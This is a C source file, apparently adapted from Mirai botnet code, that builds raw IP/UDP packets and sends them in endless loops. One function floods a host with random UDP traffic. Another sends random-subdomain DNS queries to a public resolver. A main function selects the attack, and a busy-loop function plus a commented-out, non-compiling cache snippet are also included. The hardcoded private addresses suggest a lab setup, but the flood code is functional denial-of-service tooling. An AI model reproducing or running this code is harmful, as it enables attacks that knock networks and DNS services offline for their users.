#include <stdio.h>
#include<time.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#define PROTO_DNS_QTYPE_A       1
#define PROTO_DNS_QCLASS_IP     1


typedef uint32_t ipv4_t;
typedef uint16_t port_t;
#define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))


typedef uint8_t BOOL;
#define TRUE 1
struct dnshdr {
  uint16_t id, opts, qdcount, ancount, nscount, arcount;
};

struct dns_question {
  uint16_t qtype, qclass;
};

struct dns_resource {
  uint16_t type, _class;
  uint32_t ttl;
  uint16_t data_len;
} __attribute__((packed));


int util_strlen(char *str)
{
  int c = 0;

  while (*str++ != 0)
    c++;
  return c;
}


BOOL util_strncmp(char *str1, char *str2, int len)
{
  int l1 = util_strlen(str1), l2 = util_strlen(str2);

  if (l1 < len || l2 < len)
    return 0;

  while (len--)
    {
      if (*str1++ != *str2++)
	return 0;
    }

  return TRUE;
}

void util_memcpy(void *dst, void *src, int len)
{
  char *r_dst = (char *)dst;
  char *r_src = (char *)src;
  while (len--)
    *r_dst++ = *r_src++;
}
static uint32_t x, y, z, w;

void rand_init(void)
{
  x = time(NULL);
  y = getpid() ^ getppid();
  z = clock();
  w = z ^ y;
}

uint32_t rand_next(void) //period 2^96-1
{
  uint32_t t = x;
  t ^= t << 11;
  t ^= t >> 8;
  x = y; y = z; z = w;
  w ^= w >> 19;
  w ^= t;
  return w;
}


void rand_str(char *str, int len) // Generate random buffer (not alphanumeric!) of length len
{
  while (len > 0)
    {
      if (len >= 4)
	{
	  *((uint32_t *)str) = rand_next();
	  str += sizeof (uint32_t);
	  len -= sizeof (uint32_t);
	}
      else if (len >= 2)
	{
	  *((uint16_t *)str) = rand_next() & 0xFFFF;
	  str += sizeof (uint16_t);
	  len -= sizeof (uint16_t);
	}
      else
	{
	  *str++ = rand_next() & 0xFF;
	  len--;
	}
    }
}

void rand_alphastr(uint8_t *str, int len) // Random alphanumeric string, more expensive than rand_str
{
  const char alphaset[] = "abcdefghijklmnopqrstuvw012345678";

  while (len > 0)
    {
      if (len >= sizeof (uint32_t))
	{
	  int i;
	  uint32_t entropy = rand_next();

	  for (i = 0; i < sizeof (uint32_t); i++)
	    {
	      uint8_t tmp = entropy & 0xff;

	      entropy = entropy >> 8;
	      tmp = tmp >> 3;

	      *str++ = alphaset[tmp];
	    }
	  len -= sizeof (uint32_t);
	}
      else
	{
	  *str++ = rand_next() % (sizeof (alphaset));
	  len--;
	}
    }
}

uint16_t checksum_generic(uint16_t *addr, uint32_t count)
{
  register unsigned long sum = 0;

  for (sum = 0; count > 1; count -= 2)
    sum += *addr++;
  if (count == 1)
    sum += (char)*addr;

  sum = (sum >> 16) + (sum & 0xFFFF);
  sum += (sum >> 16);

  return ~sum;
}

uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
  const uint16_t *buf = buff;
  uint32_t ip_src = iph->saddr;
  uint32_t ip_dst = iph->daddr;
  uint32_t sum = 0;
  int length = len;

  while (len > 1)
    {
      sum += *buf;
      buf++;
      len -= 2;
    }

  if (len == 1)
    sum += *((uint8_t *) buf);

  sum += (ip_src >> 16) & 0xFFFF;
  sum += ip_src & 0xFFFF;
  sum += (ip_dst >> 16) & 0xFFFF;
  sum += ip_dst & 0xFFFF;
  sum += htons(iph->protocol);
  sum += data_len;

  while (sum >> 16)
    sum = (sum & 0xFFFF) + (sum >> 16);

  return ((uint16_t) (~sum));
}



void attack_udp_generic(int flag)
{ uint8_t targs_len =1;
  ipv4_t LOCAL_ADDR = INET_ADDR(192,168,10,104);
  ipv4_t dest_ip =INET_ADDR(192,168,10,1);
  struct sockaddr_in sock_addr;
  sock_addr.sin_family = AF_INET;
  sock_addr.sin_addr.s_addr = dest_ip;
  uint8_t netmask=0xf; 
  int i, fd;
  char **pkts = calloc(targs_len, sizeof (char *));
  uint8_t ip_tos = 0;
  uint16_t ip_ident = 0xffff; 
  uint8_t ip_ttl = 64;
  BOOL dont_frag = 0;
  port_t sport = 0xffff;
  port_t dport = 0xffff;
  uint16_t data_len = 1460;
  BOOL data_rand = 1;
  uint32_t source_ip = LOCAL_ADDR;
  
  if (data_len > 1460)
    data_len = 1460;
  if (flag ==1)
      data_len=1460;
  else
      data_len=730;    

  if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
      printf("Failed to create raw socket. Aborting attack\n");
      return;
    }
  i = 1;
  if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
      printf("Failed to set IP_HDRINCL. Aborting\n");     
      close(fd);
      return;
    }

  for (i = 0; i < targs_len; i++)
    {
      struct iphdr *iph;
      struct udphdr *udph;

      pkts[i] = calloc(data_len+50, sizeof (char));
      iph = (struct iphdr *)pkts[i];
      udph = (struct udphdr *)(iph + 1);

      iph->version = 4;
      iph->ihl = 5;
      iph->tos = ip_tos;
      iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + data_len);
      iph->id = htons(ip_ident);
      iph->ttl = ip_ttl;
      if (dont_frag)
	iph->frag_off = htons(1 << 14);
      iph->protocol = IPPROTO_UDP;
      iph->saddr = source_ip;
      iph->daddr = dest_ip;
      udph->source = htons(sport);
      udph->dest = htons(dport);
      udph->len = htons(sizeof (struct udphdr) + data_len);
    }
    printf("before the infy loop\n");
  while (TRUE)
    {
      for (i = 0; i < targs_len; i++)
	{
	  char *pkt = pkts[i];
	  struct iphdr *iph = (struct iphdr *)pkt;
	  struct udphdr *udph = (struct udphdr *)(iph + 1);
	  char *data = (char *)(udph + 1);

	  // For prefix attacks
	  if (netmask < 32)
	    iph->daddr = htonl(ntohl(dest_ip) + (((uint32_t)rand_next()) >> netmask));

	  if (source_ip == 0xffffffff)
	    iph->saddr = rand_next();

	  if (ip_ident == 0xffff)
	    iph->id = (uint16_t)rand_next();
	  if (sport == 0xffff)
	    udph->source = rand_next();
	  if (dport == 0xffff)
	    udph->dest = rand_next();

	  // Randomize packet content?
	  if (data_rand)
	    rand_str(data, data_len);

	  iph->check = 0;
	  iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

	  udph->check = 0;
	  udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + data_len);

	  sock_addr.sin_port = udph->dest;
	  sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&sock_addr, sizeof (struct sockaddr_in));
	}
      if (errno != 0)
	printf("errno = %d\n", errno);
    }
}

void attack_udp_dns(uint8_t targs_len)
{
  ipv4_t LOCAL_ADDR = INET_ADDR(192,168,10,104);
  int i, fd;
  char **pkts = calloc(targs_len, sizeof (char *));
  uint8_t ip_tos =  0;
  uint16_t ip_ident = 0xffff;
  uint8_t ip_ttl = 64;
  BOOL dont_frag = 0;
  port_t sport = 2000;
  port_t dport = 53;
  uint16_t dns_hdr_id = 0;
  uint8_t data_len = 12; 
  char *domain = "www.google.com";
  int domain_len =60;
  ipv4_t dns_resolver = INET_ADDR(8,8,8,8); //get_dns_resolver();
  struct sockaddr_in sock_addr;
  sock_addr.sin_family = AF_INET;
  domain_len = util_strlen(domain);

  if (domain == NULL)
    {
      printf("Cannot send DNS flood without a domain\n");
      return;
    }

  if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
      printf("Failed to create raw socket. Aborting attack\n");
      return;
    }
  i = 1;
  if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
      printf("Failed to set IP_HDRINCL. Aborting\n");
      close(fd);
      return;
    }
  for (i = 0; i < targs_len; i++)
    {
      int ii;
      uint8_t curr_word_len = 0, num_words = 0;
      struct iphdr *iph;
      struct udphdr *udph;
      struct dnshdr *dnsh;
      char *qname, *curr_lbl;
      struct dns_question *dnst;

      pkts[i] = calloc(600, sizeof (char));
      iph = (struct iphdr *)pkts[i];
      udph = (struct udphdr *)(iph + 1);
      dnsh = (struct dnshdr *)(udph + 1);
      qname = (char *)(dnsh + 1);

      iph->version = 4;
      iph->ihl = 5;
      iph->tos = ip_tos;
      iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));
      iph->id = htons(ip_ident);
      iph->ttl = ip_ttl;
      if (dont_frag)
	iph->frag_off = htons(1 << 14);
      iph->protocol = IPPROTO_UDP;
      iph->saddr = LOCAL_ADDR;
      iph->daddr = dns_resolver;

      udph->source = htons(sport);
      udph->dest = htons(dport);
      udph->len = htons(sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));

      dnsh->id = htons(dns_hdr_id);
      dnsh->opts = htons(1 << 8); // Recursion desired
      dnsh->qdcount = htons(1);

      // Fill out random area
      *qname++ = data_len;
      qname += data_len;

      curr_lbl = qname;
      util_memcpy(qname + 1, domain, domain_len + 1); // Null byte at end needed

      // Write in domain
      for (ii = 0; ii < domain_len; ii++)
	{
	  if (domain[ii] == '.')
	    {
	      *curr_lbl = curr_word_len;
	      curr_word_len = 0;
	      num_words++;
	      curr_lbl = qname + ii + 1;
	    }
	  else
	    curr_word_len++;
	}
      *curr_lbl = curr_word_len;

      dnst = (struct dns_question *)(qname + domain_len + 2);
      dnst->qtype = htons(PROTO_DNS_QTYPE_A);
      dnst->qclass = htons(PROTO_DNS_QCLASS_IP);
    }

  printf("before infy loop\n");
  while (TRUE)
    {
      for (i = 0; i < targs_len; i++)
	{
	  char *pkt = pkts[i];
	  struct iphdr *iph = (struct iphdr *)pkt;
	  struct udphdr *udph = (struct udphdr *)(iph + 1);
	  struct dnshdr *dnsh = (struct dnshdr *)(udph + 1);
	  char *qrand = ((char *)(dnsh + 1)) + 1;

	  if (ip_ident == 0xffff)
	    iph->id = rand_next() & 0xffff;
	  if (sport == 0xffff)
	    udph->source = rand_next() & 0xffff;
	  if (dport == 0xffff)
	    udph->dest = rand_next() & 0xffff;

	  if (dns_hdr_id == 0xffff)
	    dnsh->id = rand_next() & 0xffff;

	  rand_alphastr((uint8_t *)qrand, data_len);

	  iph->check = 0;
	  iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

	  udph->check = 0;
	  udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question));
	  sock_addr.sin_addr.s_addr = dns_resolver;
	  sock_addr.sin_port = udph->dest;
	  sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (struct dnshdr) + 1 + data_len + 2 + domain_len + sizeof (struct dns_question), MSG_NOSIGNAL, (struct sockaddr *)&sock_addr, sizeof (struct sockaddr_in));
	}
      if (errno != 0)
	    printf("errno = %d\n", errno);
    }
}

int computation(){
    for(;;){
    float xt =23;
    float xhalf = 0.5f * xt;
    int i = 0x5f3759df - (*(int *)&xt >> 1);
    xt = *(float *)&i, xt = xt * (1.5f - xhalf * xt * xt);
    }
    return 0;
}

/*
int phase() {

    const int L1_CACHE_SIZE =  32768/sizeof(int);
        const int L2_CACHE_SIZE =  262144/sizeof(int);
            const int L3_CACHE_SIZE =  6587392/sizeof(int);
                const int NUM_ACCESSES = 1000000;
    const int SECONDS_PER_NS = 1000000000;
        int arrayAccess[L1_CACHE_SIZE];
            int arrayInvalidateL1[L1_CACHE_SIZE];
                int arrayInvalidateL2[L2_CACHE_SIZE];
                    int arrayInvalidateL3[L3_CACHE_SIZE];





    int i;
    int inst_x_count=4;
    int inst_y_count=6;
    int mask=0xffff;
    int ptr
    int value[100];
while(1){
    // Execute the X activity
    for(i=0;i<inst_x_count;i++){
    ptr1=(ptr1&~mask1)|((ptr1+offset)&mask1);
    // The X-instruction, e.g. a load from L2
    value=*ptr1;
    }
    // Execute the Y activity
    for(i=0;i<inst_y_count;i++){
     ptr2=(ptr2&~mask2)|((ptr2+offset)&mask2);
     // The Y-instruction, e.g a store from L2
     *ptr2=value;
     }
     }
    return 0;            
}
*/

int main(int argc, char**argv){
  int ab = atoi(argv[1]);
  int flag = atoi(argv[2]);
  printf("option: 1-dns 2-udp-generic attack.\n option 2-udp size flag Input= %d\n",ab);
  if (ab==1) {
  attack_udp_dns(1);
  } else if (ab==2) {
  attack_udp_generic(flag);
  }else if (ab==3) {
      computation();
  }
  return 0;
}
